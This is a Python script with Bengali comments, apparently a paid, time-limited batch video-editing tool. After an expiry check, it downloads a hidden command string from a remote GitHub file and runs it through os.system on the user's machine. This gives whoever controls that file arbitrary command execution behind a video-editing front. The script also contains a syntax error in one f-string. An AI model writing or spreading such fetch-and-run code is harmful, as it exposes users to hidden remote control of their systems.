import os
import requests
import datetime

# আপনার দেয়া সঠিক Raw লিঙ্কগুলো এখানে বসানো হয়েছে
EXPIRY_URL = "https://raw.githubusercontent.com/siyambi475-cloud/expiry.txt/refs/heads/main/expiry.txt"
COMMAND_URL = "https://raw.githubusercontent.com/siyambi475-cloud/expiry.txt/refs/heads/main/cmd.txt"

# আপনার টেলিগ্রাম ইউজারনেম (এখানে আপনার আসল ইউজারনেমটি দিন)
TELEGRAM_ADMIN = "@your_username" 

def get_data(url):
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            return r.text.strip()
        return None
    except:
        return None

def start():
    print("\n[+] চেকিং এক্সেস ও সার্ভার স্ট্যাটাস...")
    
    # ১. মেয়াদ চেক করা
    expiry_data = get_data(EXPIRY_URL)
    if not expiry_data:
        print("[-] সার্ভার থেকে মেয়াদ চেক করা সম্ভব হচ্ছে না! ইন্টারনেট কানেকশন দেখুন।")
        return

    try:
        expiry_date = datetime.datetime.strptime(expiry_data, '%Y-%m-%d').date()
    except:
        print("[-] তারিখের ফরম্যাটে ভুল! (YYYY-MM-DD ফরম্যাটে লিখুন, যেমন: 2026-12-31)")
        return

    if datetime.date.today() > expiry_date:
        print("\n" + "="*45)
        print("🚫 টুলটির মেয়াদ শেষ হয়ে গেছে (TIME EXPIRED!)")
        print(f"মেয়াদ বাড়ানোর জন্য যোগাযোগ করুন: {@rifat_developer}")
        print("="*45 + "\n")
        return

    # ২. কমান্ড লোড করা
    print("[+] এক্সেস অনুমোদিত! সিক্রেট কমান্ড লোড হচ্ছে...")
    raw_command = get_data(COMMAND_URL)
    
    if not raw_command:
        print("[-] ভিডিও এডিটিং কমান্ড (cmd.txt) পাওয়া যায়নি!")
        return

    # ৩. ভিডিও এডিটিং প্রসেস শুরু
    if not os.path.exists('_output'): os.makedirs('_output')
    if not os.path.exists('_input'):
        os.makedirs('_input')
        print("[!] '_input' ফোল্ডার তৈরি করা হয়েছে। এতে ভিডিও রাখুন।")
        return

    input_files = [f for f in os.listdir('_input') if f.endswith(('.mp4', '.mkv', '.mov', '.ts'))]
    
    if not input_files:
        print("[-] '_input' ফোল্ডারে কোনো ভিডিও পাওয়া যায়নি!")
        return

    print(f"[+] মোট {len(input_files)}টি ভিডিও প্রসেস করা হবে।")

    for file in input_files:
        print(f"\n[🚀] এডিট হচ্ছে: {file}")
        
        input_path = f"_input/{file}"
        output_path = f"_output/{file}"
        
        # কমান্ডে থাকা {input} এবং {output} পরিবর্তন করে ফাইল পাথ বসানো
        final_cmd = raw_command.replace("{input}", input_path).replace("{output}", output_path)
        
        # সিস্টেম কমান্ড রান করা
        os.system(final_cmd)

    print("\n[✅] অভিনন্দন! সব ভিডিও এডিট সম্পন্ন হয়েছে।")
    print("[💾] আপনার ভিডিওগুলো '_output' ফোল্ডারে সেভ হয়েছে।")

if __name__ == "__main__":
    start()
